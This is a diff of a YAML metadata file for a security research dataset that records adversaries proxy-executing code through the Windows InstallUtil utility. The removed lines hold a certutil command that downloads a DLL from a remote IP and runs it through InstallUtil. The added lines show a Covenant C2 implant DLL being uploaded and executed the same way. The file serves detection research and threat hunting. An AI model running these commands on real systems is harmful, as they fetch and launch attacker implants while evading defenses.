@@ -1,14 +1,13 @@
-title: Covenant InstallUtil
+title: Covenant ShellCmd InstallUtil
 id: SDWIN-191027223020
 author: Roberto Rodriguez @Cyb3rWard0g
 creation_date: 2019/10/27
-modification_date: 2019/10/27
+modification_date: 2020/09/19
 platform: Windows
-description: This dataset represents adversaries proxying execution of code through InstallUtil, a trusted Windows utility.
-dataset:
-  - type: Host
-    link:
-      - https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/host/covenant_installutil.tar.gz
+tags:
+  - InstallUtil
+  - LOLBin
+description: This dataset represents adversaries proxy executing code through InstallUtil, a trusted Windows utility.
 attack_mappings:
   - technique: T1218
     sub-technique: "004"
@@ -16,16 +15,19 @@ attack_mappings:
       - TA0005
       - TA0002
 notebooks:
-simulator:
-  environment: Mordor shire
-  tools:
-    - type: Interactive Session
-      name: Remote Desktop Protocol
-      module:
-      script:
-  permissions_required:
-    - User  
-  adversary_view: |-
-    certutil.exe -urlcache -split -f http://172.18.39.8/util.dll C:\ProgramData\util.dll
-    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /u c:\ProgramData\util.dll
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/host/covenant_installutil.zip
+simulation:
+    environment: Mordor shire
+    tools:
+      - type: C2
+        name: Covenant
+        module: ShellCmd
+        script: https://github.com/cobbr/Covenant/blob/7555b19ffb9401c0e37094c25e404a640b1688d7/Covenant/Data/Tasks/SharpSploit.Execution.yaml#L96
+    permissions_required:
+      - User  
+    adversary_view: |-
+      Upload Task: GruntHTTP.dll -> C:\ProgramData\GruntHTTP.dll
+      (wardog) > ShellCmd /shellcommand:"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /u c:\ProgramData\GruntHTTP.dll"
 references:
